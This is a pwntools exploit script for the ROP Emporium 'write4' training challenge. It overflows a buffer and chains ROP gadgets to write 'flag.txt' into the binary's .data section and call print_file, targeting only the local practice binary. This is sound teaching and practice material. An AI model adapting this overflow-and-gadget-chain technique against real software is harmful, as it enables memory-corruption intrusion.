#!/usr/bin/python3

# ROP Emporium - Write4

from pwn import *
#context.log_level = 'debug'

executable = './write4'
io = process(executable)
context.binary = binary = ELF(executable)

# ROP
rop = ROP(binary)
# pprint(rop.gadgets)           # Non-trivial gadgets are filtered (recommended ROPgadgets)
# exit()

payload = flat([
    b"A" * 0x28,                                        # Offset = Buf + RBP
    rop.r14.address,                                    # 0x00400690 : pop r14 ; pop r15 ; ret
    binary.get_section_by_name('.data').header.sh_addr, # 0x00601028 : -rw- section size 16 named .data
    b"flag.txt",                                        # String for `arg1`
    p64(0x00400628),                                    # rop.find_gadget(['mov qword ptr [r14], r15', 'ret']),
    rop.rdi.address,                                    # pop rdi
    binary.get_section_by_name('.data').header.sh_addr, # 0x00601028 : -rw- section size 16 named .data
    binary.symbols.print_file,                          # Win function
])

io.recvuntil(b"> ")
io.sendline(payload)

# io.interactive()
# exit()

data = io.recvall().decode()

if data.find("ROPE") != -1:
    success('Pwned!')
else:
    warn('Try again!')
print('\nReturned data:', data)
exit()
